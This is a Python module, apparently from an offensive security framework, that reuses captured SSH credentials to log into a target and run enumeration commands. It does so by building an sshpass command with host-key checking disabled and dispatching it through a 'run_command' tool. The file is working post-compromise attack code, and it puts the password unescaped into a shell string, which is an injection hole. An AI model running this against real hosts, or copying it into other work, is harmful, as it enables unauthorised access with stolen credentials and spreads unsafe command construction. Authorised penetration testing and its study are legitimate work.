"""Post-access handler for authenticated SSH credential reuse."""

from __future__ import annotations

from typing import TYPE_CHECKING

from .base import BasePostAccessHandler
from .types import AccessType, PostAccessResult

if TYPE_CHECKING:
    from hydrasight.services.dispatcher import Dispatcher


class SSHAccessHandler(BasePostAccessHandler):
    """Post-access via an authenticated SSH session.

    Runs enumeration commands over SSH using previously captured credentials.
    """

    access_type = AccessType.SSH

    def execute(
        self,
        dispatcher: Dispatcher,
        target: str,
        lhost: str,
        lport: int,
        cfg: dict,
    ) -> PostAccessResult:
        username = self.session.get("username", "")
        password = self.session.get("password", "")
        if not (username and password):
            return PostAccessResult.failure(self.access_type, "no credentials in session record")
        cmds = self._default_commands(is_windows=False)
        cmd = (
            f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
            f"-o ConnectTimeout=10 {username}@{target} "
            f"'{cmds.replace(';', ' ; ')}' 2>&1"
        )
        self.log.info("ssh post-access: %s@%s", username, target)
        try:
            _, output, _ = dispatcher.dispatch({"tool": "run_command", "args": {"command": cmd}})
        except Exception as exc:  # noqa: BLE001 — isolate per-handler dispatch failure
            return PostAccessResult.failure(self.access_type, f"ssh error: {exc}")
        return PostAccessResult(
            access_type=self.access_type,
            success=bool(output),
            output=output,
            hashes=[],
            credentials=[],
            artifacts=[],
            notes=f"ssh {username}@{target}",
        )
